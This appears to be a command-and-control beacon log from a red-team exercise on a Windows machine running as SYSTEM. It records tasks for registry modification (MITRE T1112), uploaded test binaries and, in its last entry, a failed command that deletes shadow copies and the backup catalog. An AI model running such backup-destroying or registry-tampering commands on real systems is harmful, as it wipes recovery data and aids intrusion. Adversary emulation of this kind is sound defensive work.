02/08 09:35:31 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: SYSTEM *; pid: 3232; os: Windows; version: 6.1; beacon arch: x86 (x64)
02/08 09:57:20 [task] Modify Registry with Reg.exe Method 2
02/08 09:57:30 [checkin] host called home, sent: 208 bytes
02/08 09:57:31 [output]
received output:
操作成功完成。

C:\>

02/08 10:00:27 [task] recover
02/08 10:00:31 [checkin] host called home, sent: 180 bytes
02/08 10:00:32 [output]
received output:
操作成功完成。

C:\>

02/08 10:06:29 [task] recover
02/08 10:06:29 [task] Tasked beacon to execute: C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\ExplorerAdvanced /v HideFileExt /f
02/08 10:06:32 [checkin] host called home, sent: 166 bytes
02/08 10:15:28 [task] Tasked beacon to make directory c:\RedTeam\
02/08 10:15:28 [task] cd c:\RedTeam\
02/08 10:15:28 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1112.exe as T1112.exe
02/08 10:15:28 [indicator] file: 07c5c097bd5cffd297043bee15dab5cf 7680 bytes T1112.exe
02/08 10:15:28 [task] 修改
02/08 10:15:28 [task] Tasked beacon to run: c:\RedTeam\T1112.exe
02/08 10:15:33 [checkin] host called home, sent: 7790 bytes
02/08 10:16:00 [task] Tasked beacon to make directory c:\RedTeam\
02/08 10:16:00 [task] cd c:\RedTeam\
02/08 10:16:00 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1112_recover.exe as T1112_recover.exe
02/08 10:16:00 [indicator] file: 92e1ea76e101bd859474574b571859e9 7680 bytes T1112_recover.exe
02/08 10:16:00 [task] 恢复 
02/08 10:16:00 [task] Tasked beacon to run: c:\RedTeam\T1112_recover.exe
02/08 10:16:34 [checkin] host called home, sent: 7806 bytes
02/08 11:12:33 [task] 
02/08 11:12:33 [task] Tasked beacon to run: wmic shadowcopy delete &&wbadmin delete catalog && vssadmin delete shadows /all
02/08 11:12:36 [checkin] host called home, sent: 110 bytes
02/08 11:12:36 [output]
received output:
ERROR:
Description = Initialization failure


